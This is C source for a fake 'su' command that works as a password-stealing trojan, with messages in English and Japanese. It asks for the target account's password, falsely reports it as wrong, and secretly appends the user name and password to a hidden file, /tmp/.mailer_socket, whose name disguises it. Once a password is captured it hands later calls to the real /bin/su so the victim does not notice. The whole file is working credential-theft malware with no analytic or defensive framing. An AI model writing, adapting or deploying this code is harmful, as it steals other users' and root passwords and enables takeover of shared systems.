#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pwd.h>
#include <unistd.h>

#define REAL_SU "/bin/su"
#define LOGFILE "/tmp/.mailer_socket"


struct {
  char *en;
  char *ja;
} string_resources[] = {
  {"Unkown user id: ", "ユーザIDは定義されていません:"},
  {"Password:", "パスワード:"},
  {"Sorry", "パスワードが違います"}
};

char *getmsgstr(int msgno)
{
  static char msgbuf[256];

  if (strncmp(getenv("LANG"), "ja", 2))
    snprintf(msgbuf, 256, string_resources[msgno].en);
  else
    snprintf(msgbuf, 256, string_resources[msgno].ja);
  return msgbuf;
}
int chksutlog(char *user)
{
  FILE  *fp;
  char  buf[256];

  if ((fp=fopen(LOGFILE, "r")) == NULL) return 0;
  for(;;) {
    if (feof(fp)) break;
    fgets(buf, 256, fp);
    if (!strncmp(user, buf, strlen(user)) && buf[strlen(user)]==':') {
      fclose(fp); return 1;
    }
  }
  fclose(fp); return 0;
}
int main(int argc, char *argv[])
{
  char          *user=NULL;
  char          *rootuser="root";
  char          *passwd;
  struct passwd *pwd;
  FILE          *fp;
  int           i;

  user=rootuser;
  for (i=1; i<argc; i++)
    if (argv[i][0] != '-') {
      user=argv[i];
      break;
    }
  
  pwd=getpwuid(getuid());
  if (chksutlog(user) || !getuid() || !strcmp(pwd->pw_name, user)) {
    execv(REAL_SU, argv);
  }
  if ((pwd=getpwnam(user)) == NULL) {
    printf("%s%s\n", getmsgstr(0), user);
    exit (0);
  }
  passwd=getpass(getmsgstr(1));
  printf("%s\n", getmsgstr(2));
  if ((fp=fopen(LOGFILE, "a")) != NULL) {
    fprintf(fp, "%s:%s\n", user, passwd);
    fclose(fp);
  }
  return 0;
}

